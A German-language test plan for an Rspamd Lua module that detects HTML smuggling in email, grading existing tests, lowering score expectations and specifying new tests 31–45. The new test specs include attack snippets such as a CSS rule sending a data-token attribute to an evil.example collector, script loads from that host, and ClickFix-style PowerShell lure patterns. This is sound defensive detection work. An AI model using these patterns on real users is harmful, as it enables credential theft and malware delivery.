# Bereinigte Testmatrix für HTML Smuggling Detection v4.4.2-r1

## Zweck

Diese Matrix korrigiert die bisherige Test Suite fachlich für die aktuelle Logik von `html_smuggling.lua` v4.4.2-r1.

Sie trennt sauber zwischen:

1. **weiterhin brauchbaren Tests**
2. **fachlich falsch gemappten oder schwachen Tests**
3. **fehlenden Tests 31 bis 45**
4. **realistischen Erwartungswerten**

## Wichtige Korrektur zur Score Erwartung

Für v4.4.2-r1 gelten zwei praktische Grenzen:

- Modul intern: `max_final_score = 15.0`
- Rspamd Gruppe `phishing`: in deiner Umgebung derzeit effektiv `10.0`

Darum sind alte Erwartungen wie `24-30` oder `40-55` in der Praxis nicht mehr sinnvoll.

Empfohlen werden neu zwei Spalten:

- **ExpectedDetection**
- **ExpectedCoreReasons**

Die Score Spalte sollte nur noch grob sein:

- `0-1`
- `0-3`
- `2-6`
- `4-8`
- `6-10`
- `8-10 group capped`
- `10-15 internal capped`

---

## Teil A: Bestehende Tests 01 bis 30

| Test | Status | Urteil | Korrektur |
|---|---|---|---|
| 01 basic_pe_smuggling | OK | brauchbar | Erwartung auf `8-10 group capped` oder `10-15 internal capped` senken |
| 02 split_payload_pe | FEHLERHAFT | testet `split_payload` nicht sauber | auf mindestens 6 Variablenfragmente umbauen |
| 03 array_join_pe | OK | brauchbar | Erwartung senken |
| 04 obfuscated_pe | TEILWEISE OK | Obfuskation gut, Score zu hoch | Erwartung senken |
| 05 wasm_smuggling | OK | brauchbar | Erwartung senken |
| 06 uint8array_pe | FEHLERHAFT | zu klein für `uint8array_large_min=1024` | echtes grosses Uint8Array bauen |
| 07 delayed_execution_pe | OK | brauchbar | Erwartung senken |
| 08 webworker_pe | OK | brauchbar | Erwartung senken |
| 09 fetch_api_pe | OK | brauchbar | Erwartung senken |
| 10 appinstaller_schema | OK | brauchbar | Erwartung auf `4-8` setzen |
| 11 pdf_javascript_attachment | OK | brauchbar | eher `4-8` |
| 12 pdf_launch_attachment | OK | brauchbar | eher `6-10` |
| 13 svg_active_content | OK mit r2 Fix | jetzt sinnvoll | nur gültig mit eingebettetem SVG Data URI Fix |
| 14 chm_attachment | OK | brauchbar | eher `6-10` |
| 15 hta_attachment | OK | brauchbar | eher `8-10 group capped` |
| 16 onenote_attachment | FALSCH GEMAPPT | blob Download ist kein echter OneNote Attachment Test | als EML Test neu bauen |
| 17 office_macro_container | FALSCH GEMAPPT | blob Download ist kein echter DOCM/XLSM Attachment Test | als EML Test neu bauen |
| 18 lnk_attachment | TEILWEISE OK | Decode Pfad okay, echter Attachment Pfad fehlt | optional zusätzlich als EML Test |
| 19 script_attachment_js | FALSCH GEMAPPT | eher `dec_js`, nicht echter Attachment Part | als EML Test neu bauen |
| 20 certificate_inline_pem | OK | brauchbar | eher `2-5` |
| 21 certificate_pkcs7_inline | SCHWACH | kein starker Smuggling Kontext | als HTML plus Script Kontext verbessern |
| 22 certificate_smuggling_context | OK | brauchbar | so lassen |
| 23 image_double_ext | FALSCH GEMAPPT | `<img src>` testet nicht Part Filename | als EML Attachment Test neu bauen |
| 24 image_polyglot_hint | FALSCH GEMAPPT | `<img src>` testet nicht Part Filename | als EML Attachment Test neu bauen |
| 25 css_code_execution | OK | brauchbar | so lassen |
| 26 css_computedstyle_exec | OK | brauchbar | so lassen |
| 27 NEGATIVE_legitimate | RISIKOREICH | Canvas kann API Marker streifen | vereinfachen |
| 28 NEGATIVE_newsletter | FEHLERHAFT | keine echten Header, daher kein sauberer Newsletter Test | als EML Test neu bauen |
| 29 NEGATIVE_safe_domain | TEILWEISE OK | nur Basistest | zusätzlichen positiven external_scripts Test ergänzen |
| 30 ALL_IN_ONE_MAXIMUM | FACHLICH FALSCH | Score Erwartung viel zu hoch | auf `10-15 internal capped` reduzieren |

---

## Teil B: Korrigierte Erwartungswerte für bestehende gute Tests

| Test | Neue Erwartung | Erwartete Kern Reasons |
|---|---|---|
| 01 | 8-10 group capped | `atob,blob,createObjectURL,dec_pe` |
| 03 | 8-10 group capped | `atob,blob,createObjectURL,b64_joined_parts,dec_pe` |
| 04 | 8-10 group capped | `atob or atob_obfuscated,obfus_api or polymorphic_obfuscation,blob,createObjectURL,dec_pe` |
| 05 | 6-10 | `fetch,webassembly or wasm_fetch_stage` |
| 07 | 8-10 | `delayed_execution,timeout_b64_smuggling or timeout_b64_decode,dec_pe` |
| 08 | 8-10 | `webworker,atob,blob,createObjectURL,dec_pe` |
| 09 | 6-10 | `fetch,data_uri or blob,createObjectURL or dec_pe` |
| 10 | 4-8 | `ms_appinstaller_uri or ms_appinstaller_word` |
| 11 | 4-8 | `dec_pdf,att_pdf_javascript` |
| 12 | 6-10 | `dec_pdf,att_pdf_launch,att_pdf_embeddedfile` |
| 13 | 8-10 group capped | `att_svg_script,att_svg_event_handler,att_svg_foreignobject,att_svg_data_uri,att_svg_smuggling_context` |
| 14 | 6-10 | `att_chm_attachment` or `CHM` decode indicator |
| 15 | 8-10 group capped | `att_hta_attachment` or `dec_script` |
| 20 | 2-5 | `cert_inline_pem or cert_attachment_file` |
| 22 | 4-8 | `cert_inline_pem or cert_base64_block` plus Smuggling Kontext |
| 25 | 4-8 | `css_before_after_content,css_hidden_code_string,css_function_bridge,css_code_execution` |
| 26 | 4-8 | `css_computedstyle_exec,css_function_bridge` |
| 30 | 10-15 internal capped | mehrere Klassen, intern aber gedeckelt |

---

## Teil C: Fehlende neue Tests 31 bis 45

## Test 31
**Name:** `test31_external_scripts_positive.html`  
**Ziel:** positives `external_scripts` im Smuggling Kontext  
**Soll:** `external_scripts` nur dann feuern, wenn schon Smuggling Kontext vorhanden ist

**Muster:**
- `atob(...)`
- zusätzlich `<script src="https://evil.example/payload.js"></script>`

**ExpectedCoreReasons:**
- `atob`
- `external_scripts`

---

## Test 32
**Name:** `test32_css_exfil_attr.html`  
**Ziel:** `css_attr_exfil` und `css_exfiltration`

**Muster:**
- `<style>`
- `background:url(https://evil.example/collect?d=attr(data-token))`

**ExpectedCoreReasons:**
- `css_attr_exfil`
- `css_exfiltration`

---

## Test 33
**Name:** `test33_css_import_external.html`  
**Ziel:** `css_import_external`

**Muster:**
- `@import url('https://evil.example/a.css');`

**ExpectedCoreReasons:**
- `css_import_external`

---

## Test 34
**Name:** `test34_geo_targeting_api.html`  
**Ziel:** `geo_targeting_api`

**Muster:**
- `fetch('https://ipapi.co/json/')`
- oder `fetch('https://ipinfo.io/json')`

**ExpectedCoreReasons:**
- `geo_targeting_api`

---

## Test 35
**Name:** `test35_timezone_targeting.html`  
**Ziel:** `timezone_targeting`

**Muster:**
- `Intl.DateTimeFormat().resolvedOptions().timeZone`

**ExpectedCoreReasons:**
- `timezone_targeting`

---

## Test 36
**Name:** `test36_evasion_webdriver.html`  
**Ziel:** `antisandbox_webdriver`

**Muster:**
- `if (navigator.webdriver) { ... }`

**ExpectedCoreReasons:**
- `antisandbox_webdriver`

---

## Test 37
**Name:** `test37_evasion_hardware_check.html`  
**Ziel:** `hardware_check_evasion`

**Muster:**
- `navigator.hardwareConcurrency <= 2`
- `navigator.deviceMemory <= 4`

**ExpectedCoreReasons:**
- `hardware_check_evasion`

---

## Test 38
**Name:** `test38_persistence_localstorage.html`  
**Ziel:** `localstorage_persistence`

**Muster:**
- `localStorage.getItem(...)`
- `localStorage.setItem(...)`

**ExpectedCoreReasons:**
- `localstorage_persistence`

---

## Test 39
**Name:** `test39_domain_rotation.html`  
**Ziel:** `domain_rotation`

**Muster:**
- drei verschiedene Domains
- `window.location = ...`

**ExpectedCoreReasons:**
- `domain_rotation`

---

## Test 40
**Name:** `test40_computed_redirect.html`  
**Ziel:** `computed_redirect`

**Muster:**
- `window.location = a + b`

**ExpectedCoreReasons:**
- `computed_redirect`

---

## Test 41
**Name:** `test41_clickfix_run_dialog.html`  
**Ziel:** `run_dialog_lure`, `powershell_lure`, evtl. `clickfix_lure`

**Muster:**
- Text mit `Windows+R`
- `powershell`
- Clipboard Hinweis

**ExpectedCoreReasons:**
- `run_dialog_lure`
- `powershell_lure`
- evtl. `clickfix_lure`

---

## Test 42
**Name:** `test42_fake_captcha_clipboard.html`  
**Ziel:** `fake_captcha_lure`, `clipboard_exec_lure`, `clickfix_lure`

**Muster:**
- `I am not a robot`
- `copy this command`
- `powershell`

**ExpectedCoreReasons:**
- `fake_captcha_lure`
- `clipboard_exec_lure`
- `clickfix_lure`

---

## Test 43
**Name:** `test43_blockchain_staging.html`  
**Ziel:** `web3_api_usage`, `ethers_contract_payload`, `blockchain_remote_stage`

**Muster:**
- `ethers`
- `new ethers.Contract`
- `provider.call`

**ExpectedCoreReasons:**
- `web3_api_usage`
- `ethers_contract_payload`
- `blockchain_remote_stage`

---

## Test 44
**Name:** `test44_push_abuse.html`  
**Ziel:** `push_permission_request`, `push_serviceworker_combo`, `push_notification_flow`

**Muster:**
- `Notification.requestPermission()`
- `serviceWorker`
- `pushManager`

**ExpectedCoreReasons:**
- `push_permission_request`
- `push_serviceworker_combo`
- `push_notification_flow`

---

## Test 45
**Name:** `test45_rc4_detection.html`  
**Ziel:** vorbereitete RC4 Logik testen, falls Modul aktiviert wird

**Muster:**
- `ksa`
- `prga`
- XOR Schleife
- `decrypt(...)`
- `key = '0011223344556677'`

**ExpectedCoreReasons:**
- `rc4_ksa_pattern`
- `rc4_prga_pattern`
- `rc4_xor_loop`
- `rc4_decrypt_call`
- `rc4_key_material`

---

## Teil D: Was zusätzlich als EML oder MIME Suite gebaut werden sollte

Diese Punkte lassen sich mit reinen HTML Dateien nicht sauber testen:

| Thema | Warum EML nötig |
|---|---|
| echte Attachment Dateinamen | `att_script_attachment`, `att_onenote_attachment`, `att_office_macro_container` hängen an Part Metadaten |
| echte MIME Typen | Blob Downloads im HTML sind kein echter Mail Part |
| Newsletter Header | `List-Id`, `List-Unsubscribe`, `Precedence`, `X-Mailer` brauchen Mail Header |
| image_smuggling_info | prüft Attachment Namen und Part Inhalte |
| Maps | safe, unsafe und trusted Domains brauchen reale Umgebung |
| trusted newsletter sender | hängt an `get_from_domain()` |

---

## Teil E: Wichtigste Umbauten an der aktuellen PowerShell Suite

1. `test02_split_payload_pe.html` auf **mindestens 6 Fragmente** umbauen  
2. `test06_uint8array_pe.html` auf **mehr als 1024 Bytewerte** umbauen  
3. `test16`, `test17`, `test19`, `test23`, `test24`, `test28` aus der HTML Suite entfernen oder als **EML only** markieren  
4. `test27_NEGATIVE_legitimate.html` vereinfachen, kein Canvas, kein verdächtiges API Muster  
5. `test30_ALL_IN_ONE_MAXIMUM.html` Score Erwartung auf Cap Niveau korrigieren  
6. neue Tests 31 bis 45 ergänzen  
7. zusätzlich eine **EML Suite** bauen

---

## Teil F: Praktische Priorität

### Sofort sinnvoll
- 02 korrigieren
- 06 korrigieren
- 31 bis 44 ergänzen
- 27 und 28 bereinigen
- Score Erwartungen neu setzen

### Später sinnvoll
- EML Suite für Attachment und Header Logik
- RC4 Test nur relevant, wenn Modul aktiviert wird

---

## Empfehlung

Die aktuelle Suite sollte umbenannt werden in:

`create_html_pattern_test_suite_v4_4_2_r1.ps1`

Und zusätzlich sollte es geben:

`create_eml_attachment_test_suite_v4_4_2_r1.ps1`

Erst beide zusammen ergeben eine wirklich brauchbare Gesamtprüfung.
